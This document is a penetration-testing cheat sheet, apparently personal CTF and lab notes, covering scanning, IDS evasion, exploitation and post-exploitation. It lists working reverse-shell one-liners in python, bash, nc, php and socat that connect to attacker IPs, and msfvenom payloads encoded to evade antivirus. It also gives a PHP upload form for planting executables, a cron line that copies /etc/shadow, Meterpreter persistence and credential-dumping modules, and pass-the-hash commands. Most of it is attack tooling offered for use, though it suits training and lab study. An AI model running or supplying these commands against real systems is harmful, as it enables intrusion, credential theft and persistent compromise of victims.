## Defend Against USB Rubber Ducky Attacks ##################################

# To disable external mice and keyboard input, use the below command. USB mass storage devices will still be allowed to connect to the operating system.
sudo echo 'blacklist usbhid' > /etc/modprobe.d/usbhid.conf

# Then, use the following update-initramfs command to update the boot configuration. Reboot for the changes to take effect.
sudo update-initramfs -u -k $(uname -r)


## BASIC NMAP SCANNING ################################

# Scans common ports for all services and displays reason closed | filtered
sudo nmap -p22,445,80,443,53 -sS -sV -sC -sU -A -vv -T3 -Pn --reason --script=all TARGET_X.X.X


# Verbose, syn, all ports, all scripts, no ping
sudo nmap -vv -Pn -A -sC -sS -T3 -p-  --reason TARGET_X.X.X


# Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against 1000 ports and services
sudo nmap -v -sS -sU -sC -sV -A -T3 -Pn  --reason TARGET_X.X.X


# As above but scans all TCP ports (takes a lot longer)
sudo nmap -v -sS -sC -sV -p--A -T3 -Pn  --reason TARGET_X.X.X


# As above but scans all TCP ports and UDP scan (takes even longer)
sudo nmap -v -sU -sS -sC -sV -p- -A -T3 -Pn  --reason TARGET_X.X.X


# Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover
sudo nmap -v -p 445 --script=smb-check-vulns  --script-args=unsafe=1  --reason TARGET_X.X.X


# Search nmap scripts for keywords
ls /usr/share/nmap/scripts/* | grep ftp

# RUN A PRE BUILT SCRIPT IN NMAP
nmap -T4 -A -p443 --script=ssl-enum-ciphers --verbose TARGET_X.X.X.X
 
# Runs all nmaps scripts and scans all ports of DOMAIN or IP target
nmap -T4 -A -p- -v --script=all --verbose TARGET_X.X.X.X

# Run nmap to discover OS 
nmap -O -v -n 10.50.97.0/24 --osscan-guess

# Smb script using nmap 
nmap --script smb-enum-shares 172.16.80.27


## MSFCONSOLE DATABASE SCANNING ################################

# connect database -> 
systemctl start postgresql

# created and initiazlize database  -> 
msfdb init

# check status ->
 db_status

# add new workspace -> 
 workspace -a name
 
# import existing scan from nmap -> 
db_import /PATH/FILE_NAME

# check which hosts are up using CIDR range and exclude your own machine 
db_nmap -sn -n -v --exclude 172.28.128.4 172.28.128.0/24

# do a fast scan of all TCP ports open 
db_nmap -F -sS -n -v --reason --open 172.28.128.3

# do a scan of all TCP ports open and export results into html format 
db_nmap -p- -sS -n -v --reason --open -oX ms3_TCP_ALL.xml --stylesheet=nmap.xml 172.28.128.3 

# do a fast scan of all UDP ports open
db_nmap -sU -n -v --reason --open 172.28.128.3


## HOST DISCOVERY SCANNING ################################

# bash ping sweep one liner
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

# Scan netblock range with fping to discover live hosts
sudo fping -q -a -g <IP_BLOCK>  -r 0 -e -A | tee fpingDiscovery.txt

# Scan with hping3 to discover live hosts in a range 
sudo hping3 -1 10.0.2.x --rand-dest -I eth0 

# Scan with nmap using port host discovery ping scan to discover live hosts within a range
nmap -sn -oA  nmap/discovery1 -iL ipList.txt

# Scan with nmap using ICMP Echo request host discovery scan to discover live hosts within a range
nmap -PE -oA  nmap/discovery2 -iL ipList.txt

# Scan  with nmap using TCP scan to discover live hosts within a range to NOT generate too much traffic, performing scan using the –PS argument on common ports
nmap -n -sn  -PS22,53,80,135,138,139,443,445 -oA  nmap/discovery3 -iL ipList.txt

# OS scanning 
nmap -O -v -n --osscan-guess -iL ipList.txt 

## STEALTH SCANNING ################################


# Decoy TCP syn scan stealth mode, uses 10 random spoof ip's when scanned to avoid IDS detection
sudo nmap -D RND:10 -sS -p- -Pn --disable-arp-ping -v  172.28.128.6 


# Decoy UDP syn scan stealth mode, uses 10 random spoof ip's when scanned to avoid IDS detection
sudo nmap -D RND:10 -sS -p- -Pn --disable-arp-ping -v  172.28.128.6 


# Use nmap to bypass communications with ports that are blocked by a service or the firewall with port 53 as a source port 
nmap -sS --source-port 53 -p-      10.50.97.25
OR
nmap -sS --source-port 53 -p 53   # if scanning for a specific port such as 53


# Use hping3 to bypass communications with ports that are blocked by a service or the firewall with port 53 as a source port 
hping3 -S -s 53 -p 10.50.97.25


# Use hping3 to perform a TCP Scan from port 1 to 1000 on address 10.50.97.5
hping3 -S --scan known 10.50.97.5 

# Use hping3 to perform a UDP Scan from port 1 to 1000 on address 10.50.97.5
hping3 --udp --scan known 10.50.97.5 


# Use hping3 to perform a TCP SYN Scan on IP address 10.50.97.5, scanning common ports 22,23,135,80 and determine which are open,closed and filtered.
hping3 10.50.97.5 -S –p 22 
hping3 10.50.97.5 -S –p 53 

# Use hping3 to perform a UDO Scan on IP address 10.50.97.5, scanning common ports 53 and 161 and determine which are open,closed and filtered.
hping3 10.50.97.5 --udp –p 53 

# Stealth scan to send a random fixed packet size of length 10 to avoid IDS 
sudo nmap -sS --data-length 10 -p 22 172.28.128.6


# Stealth scan with a spoof mac to specific vendor(apple) to avoid IDS detection 
sudo nmap --spoof-mac apple 172.28.128.6 -p80,443,53 -Pn --disable-arp-ping -n 


# Stealth scan a netblock range and randomize hosts order to avoid IDS detection
sudo nmap -sS -p- --randomize-hosts -T3 172.28.128.0/24


## CTF RUST SCANNING ##################################

# Use this command to set ulimit before running Rustscan
ulimit -n 15000

# Rustscan fast scanning for ALL TCP ports
rustscan IP --range 1-65535 -b 2500 -t 4000 -u 10000 -- -A -sC -sV -Pn -n -v -oA rustAllTcpPorts

# Rustscan fast scanning for ALL UDP ports
rustscan IP --range 1-65535 -b 2500 -t 4000 -u 10000 -- -sU -A -sC -sV -Pn -n -v -oA rustAllUdpPorts

# Rustscan ultrafast scanning for common TCP ports
rustscan IP --range 1-1000 -b 5000 -t 2000 -u 10000 -- -Pn -n -v --top-ports 1000 -oA rustTopTcpPorts

# Rustscan ultrafast scanning for common UDP ports
rustscan IP --range 1-1000 -b 5000 -t 2000 -u 10000 -- -sU -Pn -n -v --top-ports 1000 -oA rustTopUdpPorts

# Rustscan ultrafast vuln script scanning for common TCP ports
rustscan IP --range 1-10000 -b 5000 -t 2000 -u 10000 -- -Pn -n -v --top-ports 10000 --script vuln -oA rustVulnTopTcpPorts

# Rustscan ultrafast vuln script scanning for common UDP ports
rustscan IP --range 1-10000 -b 5000 -t 2000 -u 10000 -- -sU -Pn -n -v --top-ports 10000 --script vuln -oA rustVulnTopUdpPorts

## CTF NMAP SCANNING ##################################

# Custom Nmap fast scan for Top 5,000 most common TCP Ports 
sudo nmap --top-ports 5000 -T4 -sV -sC -Pn -A -O --osscan-guess --open --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --script http-unsafe-output-escaping --script http-sql-injection --script smb-os-discovery --script smb-enum-shares --script nfs-ls --script-timeout 180 --data-length=50 --min-parallelism 100 -oA  nmap/customTop5000TcpScan -iL ipList.txt

# Custom Nmap scan for Top 50 most common UDP Ports 
sudo nmap --top-ports 50 -sU -T4 -sV -sC -Pn --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --min-rate 450 --max-rate 15000 --script vuln --script smb-os-discovery --script smb-enum-shares --script nfs-ls --script-timeout 180 --data-length=50 --min-parallelism 100 -oA  nmap/customTop50VulnUdpScan -iL ipList.txt

# Custom Nmap Ultrafast Vuln scan for ALL TCP Ports 
sudo nmap -p- -T4 -sV -sC -Pn -O --osscan-guess --open --max-os-tries 1 --privileged -n -v --max-retries 3 --min-rtt-timeout 500ms --max-rtt-timeout 3000ms --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --script vuln --script http-unsafe-output-escaping --script http-sql-injection --script smb-os-discovery --script smb-enum-shares --script nfs-ls --script-timeout 180 --data-length=50 --min-parallelism 100 -oA  nmap/customAllTcpVulnScan -iL ipList.txt

# Nmap Vuln service scan for Top 10,000 most common TCP Ports 
sudo nmap --top-ports 10000 -T4 --open --script vuln --script http-unsafe-output-escaping --script http-sql-injection --script smb-os-discovery --script smb-enum-shares --script nfs-ls -sC -Pn -n -A -iL ipList.txt -v -oA nmap/vulnTop10,000TcpPorts

# Nmap Vuln service scan for Top 100 most common UDP Ports 
sudo nmap --top-ports 100 -T4 -sU -sV -sC --reason --script smb-os-discovery --script smb-enum-shares --script nfs-ls -Pn -n -iL ipList.txt -v -oA  nmap/vulnTop100UdpPorts

# Nmap Vuln, version, and script scan for ALL TCP ports 
sudo nmap -p- -T4 --open -Pn -n -A -sV -sC -iL ipList.txt -v -oA  nmap/AllTcpPorts

## CTF WEB SCANNING ##################################

# Nikto web scan
nikto -timeout 30 -h http://<IP>/  -output nikto.txt

# Amass passive scanning 
amass enum -passive -d owasp.org -src

# Amass active scanning 
amass enum -active -d WEBSITE -brute -w /usr/share/amass/wordlists/deepmagic.com_top50kprefixes.txt -src -ip -dir amass_scan -o amass_results_IP.txt

# feroxbuster content discovery big web scan 
feroxbuster  --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt --url http://IP --output feroxDiscoveryScan.md --threads 100 --status-codes 200,204,302
 
# feroxbuster subdomain large web scan
feroxbuster --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --url http://IP --output feroxSubdomainScan.md --threads 100

# Gobuster common web scan (with creds to login console)
/home/kali/Shared/Opt-Tools/gobuster/gobuster-linux-amd64/./gobuster dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -x .txt,.zip,.html,.php,.js,.json,.pdf,.api -r --output goBuster.md --url http://10.10.102.247:8080 -U joker -P hannah

# bruteforcing console with random numbers 
wfuzz -w numbers --hh 1004 -c -H 'X-Remote-Addr: 127.0.0.1' -d 'number=FUZZ' -u http://IP:8085/

# Dirsearch medium web scan 
python3 /home/kali/Shared/Opt-Tools/dirsearch/dirsearch.py -u http://IP/ -t 100 --extensions=all --plain-text-report=dirsearch.md -E -x 400 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l

# ffuf common web scan 
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://IP/FUZZ -e .json,.php,.html,.bak,.old,.sql -fc 403 -of md -o ffufCommon.md

# ffuf large web scan
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://IP/FUZZ -of md -o ffufBig.md

# ffuf large subdomain scan 
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.IP." -u http://IP/ -of md -o ffufSubdomains.md 

# Virtual Hosts gobuster fuzzing
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url http://<DOMAIN> -t 100 --output goBusterSubdomain.md | grep "Status: 200" | cut -d " " -f 2

# Virtual Hosts wfuzz fuzzing
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 404 --hl 9  -c -t 50 -u http://DOMAIN.HERE -H 'Host: FUZZ.DOMAIN.HERE'


## SNIPER AUTOMATED SCANNING ################################

# Configuration templates are an easy way to dynamically load specific Sn1per settings for each scan which opens up endless flexibility for each scenario. Below is webpwn attack template example, path of template goes after -c
sniper -f targets.txt -c /usr/share/sniper/conf/fast_service_portscan  -w WORKSPACE

# DISCOVER MODE
sudo sniper -t <CIDR> -m discover -w <WORSPACE_ALIAS>

# NORMAL MODE + OSINT + RECON
sudo sniper -t <TARGET> -o -re

# STEALTH MODE + OSINT + RECON
sudo sniper -t <TARGET> -m stealth -o -re

# FULLPORTONLY SCAN MODE
sudo sniper -t <TARGET> -fp

# HTTP WEB PORT MODE
sudo sniper -t <TARGET> -m webporthttp -p <port>

# HTTPS WEB PORT MODE
sudo sniper -t <TARGET> -m webporthttps -p <port>

# MASS PORT SCAN MODE
sudo sniper -t IP -m massportscan -w <WORKSPACE_ALIAS>

# MASS WEB SCAN MODE
sudo sniper -t IP -m massweb -w <WORKSPACE_ALIAS>

# MASS VULN SCAN MODE
sudo sniper -f ipList.txt -m massvulnscan -w <WORKSPACE_ALIAS>
 
# ENABLE BRUTEFORCE
sudo sniper -t <TARGET> -b

# NUKE MODE WITH TARGET LIST, BRUTEFORCE ENABLED, FULLPORTSCAN ENABLED, OSINT ENABLED, RECON ENABLED, WORKSPACE & LOOT ENABLED
sudo sniper -f ipList.txt -m nuke -w <WORKSPACE_ALIAS>


## RECONNOITRE SCANNING ####################################

# Scan a single host, create a file structure and discover services
sudo reconnoitre -t IP -o /home/kali/Recon/DIR --services

# Discover live hosts and hostnames within a range
sudo reconnoitre -t IP -o /home/kali/Recon/DIR --pingsweep --hostnames

# Discover live hosts within a range and then do a quick probe of (TCP and UDP) ports for services
sudo reconnoitre -t IP -o /home/kali/Recon/DIR --pingsweep --services --quick

# Discover live hosts within a range and then do probe all TCP ports and services only
sudo reconnoitre -t IP -o /home/kali/Recon/DIR --pingsweep --services --no-udp

# Discover live hosts within a range and then do probe for all ports (UDP and TCP), scan for services, dns, snmp , hostnames
sudo reconnoitre -t IP -o /home/kali/Recon/DIR --pingsweep --dns --hostnames --services

## ZOMBIE SCANNING ##################################

# Use hping3 to find a zombie for a possible idle scan. if ID increments by 1 for each packet (id=+1), target is not sending packets through the network and is a good zombie candidate
hping3 -S -r -p 135 10.50.97.10

# Use nmap to find zombie, if the output value of (IP ID Sequence Generation) is on Incremental, we can consider the target as a good candidate for our idle scan.
nmap –O –v –n 10.50.97.10

# Use hping3 Idle scan using zombie found to check which of the following hosts have a restricted port open. Restart the Hping scan on the zombie with command (hping3 -S -r -p 135 10.50.97.10). This will show us ID’s on the fly. Open another console and run the following command (hping3 -a 10.50.97.10 -S -p 135 10.50.97). If the zombie ID increment is id=+2 on (Console 1) instead of id=+1, we can deduce that port 135 on the target 10.50.97.5 is open. Otherwise, if the ID still increments by 1, we can deduce that the port is closed.

## ICMP Redirect Attack Scapy script##################################

# Creating and sending ICMP redirect packets
originalRouterIP= '<The router IP address>'
attackerIP= '<Your VPN IP Address>'
victimIP= '<The Victim IP Address>'
serverIP= '<The Web Server IP Address>'
# We create an ICMP Redirect packet
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP
# The ICMP packet payload /should/ contain the original TCP SYN packet
# sent from the victimIP
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555
while True:
	send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
# Press <enter>

## OTHER NOTES ##################################

# cracking passwords with hashcat 
hashcat -m 3200 jonah.hash /home/nonroot/Wordlists/rockyou.txt -w 4 -D 1 -a 0 --status-timer=10 --status --force

-m (hash-type option this defines the specific hash type to crack: bcrypt)
-w (workload-profile this is the overall resource mode to use on a scale from 1 to 4 with 1 being very slow scan to 4 being highly aggresive rescource heavy scan)
-D (opencl-device-types option to use CPU only, use -D 2 for GPU. or -D 1,2 for both CPU and GPU)
-a ( attack-mode option for doing a straight dictionary bruteforce of a list)

# convert xml to html for reporting 
xsltproc FILE.xml -o NEW_FILE.html

# Editing Crontab with a bash script to escalte priv via SETUID 
echo -e ‘#!/bin/bash\n/bin/cat /etc/shadow > /tmp/shadow’ > /etc/cron.hourly/oddjob


# Command to identify the reachable networks and gateways
sudo ip route show dev tap0

# Conduct a DNS zone fer using domain and IP
dig @172.16.5.10 sportsfoo.com -t AXFR +nocookie

# SSH into machine  
ssh username@ipaddress 

# Burpsuite Hera Lab Advanced Scope Control Example
Protocol: HTTP
Host: 	 ^xss1\.webapp\.site$  (original url is http://xss1.webapp.site/) 
Port:    ^80$
File:    ^/.*

# Obtain useful information from DNS record using nslookup, then use command typing typing each subdomain to get the IP address of each  
nslookup 
server 10.50.96.5 
set q=MX 
foocampus.com

nslookup 
server 10.50.96.5 
set q=NS
foocampus.com


# Conduct a zone transfer with host command
host -t axfr foocampus.com 10.50.96.5

# enumerate smb 
nmblookup -A IP

# access smb anonymous account 
smbclient -L 10.130.40.70

# connecting to guest/anonymous smb share
smbclient \\\\IP\\SHARE_NAME

# download smb share file
mget FILE

# smb exploitation with crackMapExec
/home/user/Shared/Opt-Tools/crackMapExec/cme smb TARGET -u USER -p PASS

## REVERSE SHELLS AND PAYLOADS ##################################

# Create a Meterpreter Windows Reverse TCP payload with msfvenom 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.1.99 LPORT=1338 -f exe > shell.exe


# Encoding a msfvenom payload with 5 iterations of x86/shikata_ga_nai to avoid being  flagged as a malicious file  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=1337 -f exe -e x86/shikata_ga_nai -i 5 > s.exe


# Upload a new Metasploit meterpreter payload executable using the following PHP code would provide us with a form we can use to upload our executable
<?php
if(isset($_POST["submit"])) {
$name = $_FILES['file_upload']['name'];
// Check for errors
if($_FILES['file_upload']['error'] > 0)
die('An error ocurred');
// Upload file
if(!move_uploaded_file($_FILES['file_upload']['tmp_name'],$name))
die('Error uploading');
die('File uploaded successfully.');
}?>
<form method='post' enctype='multipart/form-data'>
File: <input type='file' name='file_upload'>
<input type="submit" value="Upload Image" name="submit">
</form>


# get a python reverse shell to execute arbitrary commands via url (RFI/LFI vuln)
https://TARGET/xl0827_dev_/?x=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.17",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno()2);p=subprocess.call(["/bin/sh","-i"]);'

# python reverse shell via terminal
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.17",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                                                                                                     ^ATTACKER^,^NC PORT^                
# upgrade a nc reverse shell to a meterpreter shell with script
1. setup a multi handler listener on metasploit on port 9999 with payload linux/x86/shell_reverse_tcp
2. run the command on nc shell terminal below
3. bash -i >& /dev/tcp/10.13.1.99/1337 0>&1
4. Now we have a reverse meterpreter shell and a nc shell o

# one liner bash reverse shell with a pwn cat listner(netcat on steriods) for shells
rm /tmp/rv; mkfifo /tmp/rv; nc 10.9.0.17 1337 0</tmp/rv | /bin/bash >/tmp/rv 2>&1
cd /home/kali/Shared/Opt-Tools/pwncat && source pwncat-env/bin/activate
pwncat -lp 4444 

# one liner sh reverse shell with a pwn cat listner(netcat on steriods) for stable shells
rm /tmp/rv; mkfifo /tmp/rv; nc 10.9.0.17 1337 0</tmp/rv | /bin/sh >/tmp/rv 2>&1
cd /home/kali/Shared/Opt-Tools/pwncat && source pwncat-env/bin/activate
python -m pwncat -lp 4444 

# php payload to obtain a rev-shell via url injection, on burp, switch user agent to <?php system($_GET['cmd']);?>
php -r '$sock=fsockopen("10.9.0.17",1337);exec("/bin/sh -i <&3 >&3 2>&3");'


# method 2 php rev shell via burp request, fire up python to serve pentest monkeys php shell, then navigate to url
<?php file_put_contents('shell.php', file_get_contents('http://10.13.1.99/miniShell.php'))?>

## SUID and SUDO FINDINGS ##################################

# Find what does the user have the ability to sudo as root for a certain file
sudo -l

# The following commands can discover all the SUID executables that are running on a target.  Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user.
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -perm -4000 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

 
## Post Explotation  ##################################

# In order to discover hosts, gather IP's, open ports, services , & pivot inside an organization network(internal) from a outside/public network (external) we can use msf modules  
# First we need to set the route to the network with the following command via meterpreter: 
 run autoroute -s XXX.XX.XX.XX 

# setup persistence configs which sets up a metasploit handler automatically to match meterpreter input
run persistence -S -U -X -p 443 -r tun0 -P windows/x64/meterpreter/bind_tcp -A
run persistence -S -U -X -p 4343 -r tun0 -P windows/x64/meterpreter/reverse_tcp -A

# Other post exploitation modules
run winenum			                                                   --->   enum all windows services via meterpreter session 
use exploit/windows/local/persistence                                            ---> maintining access via a backdoor , setup persistent shell via meterpreter and metasploit
run arp_scanner –r 10.32.120.0/2                                                 -> run arp scan to map network via meterpreter 
run autoroute -s                                                                 --> set the route to an internal network with the following command via meterpreter
use sniffer | sniffer_interfaces | sniffer_start | sniffer_dump | sniffer_stop  -->   perform sniffing on network and try to detect any active devices for pivoting
use post/multi/recon/local_exploit_suggester                                     ---> scans a system for local vulnerabilities contained in Metasploit. It then makes suggestions for exploiting
run post/windows/gather/enum_patches                                            --> show patches that have not been installed for exploiting
run post/windows/gather/enum_computers                                          ---> display all machines in the network
run post/windows/gather/win_privs                                               --> display all the privileges that we have plus some other information about the system
post/windows/gather/arp_scanner                                                 --> to run arp scanner on networks
use auxiliary/scanner/portscan/tcp                                              --> to scan for open ports 
use exploit/windows/local/bypassuac                                            --> bypass uac to obtain admin access 
use exploit/windows/local/current_user_psexec                                    --> module uploads executable file to victim,creates share containing file, creates remote service on each target using UNC path to file, and  starts the service
post/windows/gather/enum_applications                                          --> eunmerate services running
post/windows/gather/hashdump                                                   -- > dump windows hashes 
post/windows/gather/smart_hashdump                                             -- > smart dump hashes 
post/windows/manage/migrate                                                    ---> migrate to another service
post/windows/gather/credentials/credential_collector                           --> gather other credentials 
post/windows/gather/credentials/sso                                            --> This module will collect clear text Single Sign-On credentials from the Local Security Authority
post/windows/gather/phish_windows_credentials                                  --> perform a phishing attack on target by popping up a login prompt. When user enters creds in the prompt, they will be sent to attacker
post/windows/gather/enum_logged_on_user                                        --> enums users
post/windows/gather/enum_computers                                             --> enums machines
post/windows/gather/enum_shares                                                --> enums shares
post/windows/gather/enum_snmp                                                  ---> enums snmp
use exploit/windows/local/service_permissions		                         -->  attempts to find weak permissions in existing services and adds a service if possible for priv escalation
use exploit/windows/local/unquoted_service_path				 --> checks if an attacker is able to place a malicious executable in unexpected paths, technique was previously called Trusted Service Path		
use windows/manage/run_as                                                      --> module to execute our payload as a specific user, for example; if you have creds for AD user, you can execute command as that user to privEsc 
use exploit/linux/samba/trans2open                                             --->  samba exploit for linux
use windows/gather/credentials/domain_hashdump
run post/windows/gather/enum_logged_on_users
use post/multi/manage/shell_to_meterpreter
 

## Windows-Exploit-Suggester-Next-Gen ( first run command on target machine: systeminfo.exe > systeminfo.txt )###################

# running command below to check generated systeminfo output file via windows shell , in addition show only vulnerabilities with known exploits
/home/kali/Shared/Opt-Tools/windows-Exploit-Suggester-Next-Gen-wespy/wes.py systeminfo.txt -e 

# running command below to check generated systeminfo output file via windows shell , in addition filter out vulnerabilities of KBs published before the publishing date of the most recent KB installed
/home/kali/Shared/Opt-Tools/windows-Exploit-Suggester-Next-Gen-wespy/wes.py systeminfo.txt systeminfo.txt -d 

## windows-privesc-check

# will create a detailed HTML report and text based report for review
windows-privesc-check2.exe --audit -a -o report 


##PROXYCHAINS | PORTFORWARDING | PROXY | LATERAL MOVEMENT##################################
 
# Configure a proxy where all the nmap traffic will pass through. All the traffic sent to our local address on port 1080 will go through Metasploit. Using the following msf module
use auxiliary/server/socks4a 

# We can now use nmap with proxychains to redirect the whole scan. using proxychain we are able to redirect nmap traffic through MSF proxy, then redirect it through meterpreter 

# Use incognito to impersonate administrator in windows via meterpreter to obtain domain access/root
use incognito
list_tokens -u
impersonate_token TOKEN_NAME\\GOES_HERE

# Get information from the AD infrastructure by loading the extapi extension, then enumerate computer and users:
load extapi
adsi_computer_enum DOMAIN_NAME_HERE
adsi_user_enum	DOMAIN_NAME_HERE

# Load kiwi module via meterpreter and dump ALL CREDENTIALS
load kiwi
creds_all 

# list shares without any credentials on  windows machine 
net view 172.30.111.10

# without using any credentials, we are able to enumerate shares on the target. We can now navigate organization machine shares and use the net use command and download shares for viewing
net use K: \\172.30.111.10\FooComShare
download K:\\Confidential.txt

## FIX DPKG LOCK ERROR ##################################

# Use the Linux command line to find and kill the running process. To do that, use the command below:
ps aux | grep -i X

# This will show the id of the process running apt or apt-get. In the example below, the process id is 7343. You can use the process id to terminate it by sending the SIGTERM signal. Replace the <process_id> with the number you got in the output 
sudo kill <process_id>

#Check if the process was killed by running the ‘ps aux | grep -i apt’ command. If it is still running, force kill it with SIGKILL signal:
sudo kill -9 <process_id>

# Another, easier way would be to use the killall command. This will kill all the instances of a running program:
sudo killall apt apt-get


## Upload/transfer files to target machine ##################################

(https://www.hacktoday.io/t/transfer-files-post-exploitation-cheatsheet/2632)

# Simple HTTP Server Method - With this method we will host our file to upload with a simple python server, and then download it with wget in the victim (or curl if it is not installed).

# Attacking machine command: 	
python -m SimpleHTTPServer 80

# Upload Single File on Victim machine: 
wget http://IP/FiletoTransfer  or -> curl -o FiletoTransfer http://IP/FiletoTransfer

# Upload An Entire Directory to Victim machine and avoid downloading auto-generated index.html files: 
wget -r -np -R "index.html*" http://URL/DIR/    or wget -r -nH --cut-dirs=2 --no-parent --reject="index.html*" http://URL/DIR/ 


# SCP(SSH utility) - This method will only be valid if the target machine has ssh and we have the credentials. We will use the scp utility to transfer the file
To copy a file from a local to a remote system run the following command:
scp file.txt remote_username@10.10.0.2:/remote/directory/

# Netcat - We will use the tool that is known as the Swiss knife of the hacker, netcat. Most computers with linux have it installed so this is an advantage.
Victim machine command: -> nc -lvnp 4444 > FiletoTransfer
Attacking machine command: -> nc TARGET_IP 4444 -w 3 < FiletoTransfer

# FTP - We will mount a temporary ftp (we could use a conventional ftp) using the twistd utility to access from the victim and download the file
Attacking machine command: -> twistd -n ftp -r .
Victim machine command: - > wget ftp://IP/FiletoTransfer


## Download files from target machine ##################################
(>>https://www.hacktoday.io/t/transfer-files-post-exploitation-cheatsheet/2632<<)

# Simple Server HTTP - This method is the same as it is to upload a file but the other way around. In this case the victim machine must have python to run the simple server. We have to take into account that we will not have permits to lift any port. We could also move our file to the web server folder if, for example, it has the apache running, although for that we should have permissions.

Victim machine command: -> python -m SimpleHTTPServer 8080
Attacking machine command: -> wget http://TARGET_IP:8080/FiletoDownload

# Netcat - We will also use the netcat tool in reverse order to upload the file to the victim machine. It is important to take into account the permits on the ports to be used.

Destination machine command: -> nc -l -p 7555 > myfile.txt
Source machine command:     ->  nc 10.1.1.2 7555 < myfile.txt



### Spawning a TTY Stable Shell ##################################

# execute on victim machine  
/usr/bin/script -qc /bin/bash /dev/null 
 
# using python bash
on reverse shell terminal, enter the following command -> python -c "import pty; pty.spawn('/bin/bash')" 
on same terminal with reverse shell hit ->  ctrl+Z 
on same terminal with reverse shell enter -> stty raw -echo 
on same terminal with reverse shell enter -> fg  (we will not be able to see this command while typing, the fg shell command continues a stopped job by running it in the foreground)
on same terminal with reverse shell enter -> export TERM=xterm  (we will not be able to see this command while typing)
we should now have a stable shell on our target 

# using echo
echo os.system('/bin/bash')

# using sh
/bin/sh -i

# python sh shell
python -c "import pty; pty.spawn('/bin/sh')"

# python bash shell
python -c "import pty; pty.spawn('/bin/bash')"

# using socat
Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.13.1.99:4444


# using perl
perl —e 'exec "/bin/sh";'

# using perl
perl: exec "/bin/sh";

# using ruby
ruby: exec "/bin/sh"

# using lua
lua: os.execute('/bin/sh')

# (From within IRB)
exec "/bin/sh"

# (From within vi)
:!bash

# (From within vi)
:set shell=/bin/bash:shell

# (From within nmap)
!sh


## Staged VS Unstaged Payloads ##################################

#  Unstaged (Non-staged) Payloads 
windows/shell_reverse_tcp (via netcat) 
linux/x86/shell_reverse_tcp (via netcat)

# Staged Payloads 
windows/shell/reverse_tcp (via meterpreter)
linux/x86/shell/reverse_tcp (via meterpreter)

# Note - You might not have noticed, but most payloads you will be using have a very similar twin. For example, note the subtle difference between “windows/shell_reverse_tcp” and “windows/shell/reverse_tcp”. The first one is unstaged, while the second is staged. You will see the same naming convention with many other payloads too. What’s the difference between staged and unstaged? If you use an unstaged payload, the entire payload is sent in one hit and executed on the target machine. This means that you can catch the shell with a simple netcat listener and it will work fine. If you’re using a staged payload, you need to use a Metasploit multi handler to catch the shell (this is allowed in the exam, by the way!). If you attempt to use a netcat listener to catch the shell, the connection will be received and then die instantly. Staged payloads are a smaller initial payload which then downloads the full payload from the Metasploit handler on your local box. They’re great if you don’t have much space for the exploit. Which should you use? It’s up to you. In the temperamental world of buffer overflows, sometimes one will work while the other won’t, so it’s good to have both in your bag of tricks!

## Compiling Exploits ##################################

# Cross-compiling - You'll probably discover at some point that you can't just compile Windows C exploits on a Kali machine and expect them to work. This is where cross-compiling tools come in, but don't expect them to work perfectly. There are all sorts of dumb platform quirks that still get in the way, like missing libraries. When cross-compiling, be prepared to google a lot of error messages.

# Download and install a cross-compiler for Linux:
apt-get install mingw-w64

# To compile code for a 64-bit Windows target:
x86_64-w64-mingw32-gcc shell.c -o shell.exe

# To compile code for a 32-bit Windows target:
i686-w64-mingw32-gcc shell.c -o shell.exe


## MISC ##################################

# connect to remote share via pass the hash
proxychains pth-smbclient -U FOOPHONES/share_admin%aad3b435b51404eeaad3b435b51404ee:7bada89c6d6782bc59c9a0a4b7f340fa //10.185.10.34/ADMIN$


# nmap script top 20 ports scanned
TCP - 20,21-23,25,53,80,110-111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080

# nmap script top200 ports TCP & UDP
